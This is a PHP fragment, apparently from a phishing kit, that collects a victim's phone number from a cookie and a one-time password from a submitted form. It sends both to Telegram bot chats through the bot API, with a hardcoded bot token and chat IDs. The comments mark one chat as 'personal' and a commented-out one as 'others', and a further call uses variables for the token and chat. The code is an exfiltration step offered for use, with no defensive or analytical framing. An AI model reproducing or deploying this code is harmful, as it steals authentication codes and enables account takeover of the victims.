// personal
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-578705759&text=" . $_COOKIE['number'] . " OTP: " . $_POST['otp']);

// others
//file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=" . $_COOKIE['number'] . " OTP: " . $_POST['otp']);


$otp = "\nOTP: " . $_POST['otp'];
//$otp = NULL;

$data = [
'chat_id' => $Chat_ID,
'text' => "Number: " . $_COOKIE['number'] . $otp
];
file_get_contents("https://api.telegram.org/bot" . $Api_Token . "/sendMessage?" . http_build_query($data));

//comment this if you want blank
//$_POST['otp'] = NULL;
